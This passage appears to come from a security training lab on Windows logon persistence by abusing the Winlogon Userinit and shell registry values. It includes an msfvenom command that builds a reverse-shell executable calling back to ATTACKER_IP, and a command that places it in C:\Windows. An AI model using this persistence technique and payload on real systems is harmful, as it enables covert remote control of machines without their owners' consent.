Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.

Note:
	If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

```shell-session
C:\> move revshell.exe C:\Windows
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.
